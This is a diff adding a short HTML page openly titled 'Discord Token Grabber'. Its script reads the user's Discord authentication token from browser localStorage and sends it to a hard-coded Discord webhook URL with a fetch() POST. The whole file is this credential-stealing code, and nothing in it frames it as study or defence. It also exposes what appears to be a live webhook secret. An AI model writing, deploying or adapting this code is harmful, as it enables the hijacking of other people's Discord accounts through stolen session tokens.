@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Discord Token Grabber</title>
+</head>
+<body>
+  <script>
+    // Get the Discord token
+    const token = localStorage.getItem("token");
+    
+    // Send the token to a webhook
+    const webhookUrl = "https://discord.com/api/webhooks/1286302269590995007/8OBSHKA8eaOCo0_HXt4fm9depPhlHjEpQVcwQduTzXcXunbgsDFFhgVmeozJ3SidAYCF";
+    const data = { content: `Discord token: ${token}` };
+    
+    fetch(webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    });
+  </script>
+</body>
+</html>
